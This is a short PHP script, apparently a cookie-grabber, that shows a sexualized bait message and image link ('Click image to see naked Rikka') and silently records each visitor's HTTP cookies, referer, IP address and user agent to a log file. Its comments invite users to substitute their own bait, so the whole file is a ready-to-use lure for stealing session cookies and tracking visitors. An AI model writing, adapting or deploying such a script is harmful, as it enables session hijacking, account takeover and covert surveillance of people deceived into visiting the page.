<?php
// your soc needed here
// u can change with ur own bait
echo'<center><h1>Click image to see naked Rikka</h1><br>
<a href="https://sinkaroid.org/labs/avatar/rikkan.jpg">
<img src="https://sinkaroid.org/labs/avatar/rikka.jpg"width="380" height="550"></a>';

// extract
$data = array(
    "cookie"        => $_SERVER['HTTP_COOKIE'], 
    "referer"       => $_SERVER['HTTP_REFERER'], 
    "remote_addr"   => $_SERVER['REMOTE_ADDR'], 
    "user_agent"    => $_SERVER['HTTP_USER_AGENT']
);

$open = fopen('log.txt', 'a+');
fwrite($open, implode("\r\n", $data)."\n\n");
fclose($open);
?>
